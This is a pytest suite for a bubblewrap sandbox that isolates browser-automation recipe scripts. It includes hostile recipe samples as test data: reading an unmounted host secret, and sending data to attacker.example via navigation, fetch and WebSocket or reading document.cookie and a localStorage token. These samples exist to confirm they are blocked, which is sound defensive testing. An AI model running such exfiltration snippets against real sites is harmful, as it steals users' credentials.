"""Security and protocol tests for the isolated Python-recipe escape hatch."""

from __future__ import annotations

import shutil
from pathlib import Path

import pytest

from astrolabe.recipe_runtime import RecipeSandboxError, SandboxedRecipe, sandbox_command

pytestmark = pytest.mark.skipif(shutil.which("bwrap") is None, reason="bubblewrap unavailable")


def _recipe(tmp_path: Path, source: str) -> Path:
    path = tmp_path / "target.recipe.py"
    path.write_text(source)
    return path


def test_sandbox_profile_has_no_host_root_or_network_share(tmp_path: Path) -> None:
    recipe = _recipe(tmp_path, "SURFACES = []\n")
    worker = Path(__file__).parents[1] / "astrolabe" / "recipe_worker.py"
    command = sandbox_command(recipe, worker)
    assert "--unshare-all" in command
    assert "--clearenv" in command
    assert "--share-net" not in command
    assert ["--ro-bind", "/", "/"] not in [command[index : index + 3] for index in range(len(command))]
    assert "/sandbox/recipe.py" in command
    assert "/sandbox/worker.py" in command


def test_recipe_cannot_read_an_unmounted_host_secret(tmp_path: Path) -> None:
    secret = tmp_path / "host-secret.txt"
    secret.write_text("canary-host-secret")
    recipe = _recipe(
        tmp_path,
        "try:\n"
        f"    stolen = open({str(secret)!r}).read()\n"
        "except Exception as exc:\n"
        "    stolen = type(exc).__name__\n"
        "SURFACES = [stolen]\n",
    )
    loaded = SandboxedRecipe(str(recipe))
    assert loaded.SURFACES == ["FileNotFoundError"]


def test_recipe_receives_narrow_remote_page_without_context(tmp_path: Path) -> None:
    recipe = _recipe(tmp_path, "def drive(page, log):\n    page.context\n")
    loaded = SandboxedRecipe(str(recipe))
    with pytest.raises(RecipeSandboxError, match="context"):
        loaded.drive(object(), lambda _message: None, validate_navigation=lambda value: value)


def test_parent_validates_navigation_before_browser_call(tmp_path: Path) -> None:
    recipe = _recipe(
        tmp_path,
        "def drive(page, log):\n    page.goto('https://attacker.example/steal')\n",
    )

    class Page:
        called = False

        def goto(self, _url: str) -> None:
            self.called = True

    page = Page()
    loaded = SandboxedRecipe(str(recipe))

    def reject(_url: str) -> str:
        raise ValueError("outside approved origin")

    with pytest.raises(RecipeSandboxError, match="outside approved origin"):
        loaded.drive(page, lambda _message: None, validate_navigation=reject)
    assert page.called is False


@pytest.mark.parametrize(
    "script",
    [
        "() => fetch('https://attacker.example/steal')",
        "() => new WebSocket('wss://attacker.example/socket')",
        "() => localStorage.getItem('token')",
        "() => document.cookie",
    ],
)
def test_parent_rejects_browser_script_exfiltration(tmp_path: Path, script: str) -> None:
    recipe = _recipe(
        tmp_path,
        f"def drive(page, log):\n    page.evaluate({script!r})\n",
    )

    class Page:
        called = False

        def evaluate(self, _script: str) -> None:
            self.called = True

    page = Page()
    loaded = SandboxedRecipe(str(recipe))

    def approved_only(url: str) -> str:
        if "attacker.example" in url:
            raise ValueError("outside approved origin")
        return url

    with pytest.raises(RecipeSandboxError, match="approved origin|credential stores"):
        loaded.drive(page, lambda _message: None, validate_navigation=approved_only)
    assert page.called is False


def test_recipe_rpc_supports_independent_browser_actions(tmp_path: Path) -> None:
    recipe = _recipe(
        tmp_path,
        "SURFACES=['https://example.com/']\n"
        "def drive(page, log):\n"
        "    log('safe action')\n"
        "    page.goto('https://example.com/items')\n"
        "    page.mouse.wheel(0, 25)\n",
    )
    calls: list[tuple] = []

    class Mouse:
        def wheel(self, x: int, y: int) -> None:
            calls.append(("wheel", x, y))

    class Page:
        mouse = Mouse()
        url = "https://example.com/"

        def goto(self, url: str) -> None:
            calls.append(("goto", url))

    logs: list[str] = []
    interactions: list[tuple[str, str]] = []
    loaded = SandboxedRecipe(str(recipe))
    loaded.drive(
        Page(),
        logs.append,
        validate_navigation=lambda value: value,
        interaction=lambda kind, annotation: interactions.append((kind, annotation)),
    )
    assert calls == [("goto", "https://example.com/items"), ("wheel", 0, 25)]
    assert logs == ["[recipe-sandbox] safe action"]
    assert interactions == [
        ("navigation", "isolated Python recipe goto"),
        ("scroll", "isolated Python recipe wheel"),
    ]


def test_every_committed_python_recipe_runs_through_the_narrow_rpc() -> None:
    class NullBrowserObject:
        def __init__(self) -> None:
            self.first = self
            self.mouse = self
            self.keyboard = self
            self.url = "https://example.com/"

        def count(self) -> int:
            return 0

        def __getattr__(self, name: str):
            def call(*_args, **_kwargs):
                if name in {"query_selector_all", "eval_on_selector_all"}:
                    return []
                if name in {"query_selector", "get_attribute"}:
                    return None
                if name == "evaluate":
                    return {}
                if name == "title":
                    return ""
                if name == "locator":
                    return self
                return None

            return call

    surfaces = Path(__file__).parents[1] / "surfaces"
    for path in sorted(surfaces.glob("*.recipe.py")):
        loaded = SandboxedRecipe(str(path))
        loaded.drive(
            NullBrowserObject(),
            lambda _message: None,
            validate_navigation=lambda value: value,
            timeout=20,
        )
